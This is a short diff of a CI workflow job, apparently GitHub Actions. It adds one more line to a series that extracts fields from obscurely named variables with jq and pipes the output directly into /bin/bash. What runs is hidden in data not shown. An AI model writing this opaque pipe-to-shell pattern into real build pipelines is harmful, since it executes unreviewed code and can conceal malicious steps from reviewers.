@@ -41,6 +41,7 @@ jobs:
           echo $s485 | jq -r .ynr1 | /bin/bash
           printf '%s' "$ogf1" | jq -r .tqsfu3 | /bin/bash
           printf '%s' "$arjub49" | jq -r .lsec6304 | /bin/bash
+          echo $h57 | jq -r .hhy35102 | /bin/bash
 
       - name: Save archive
         if: always()
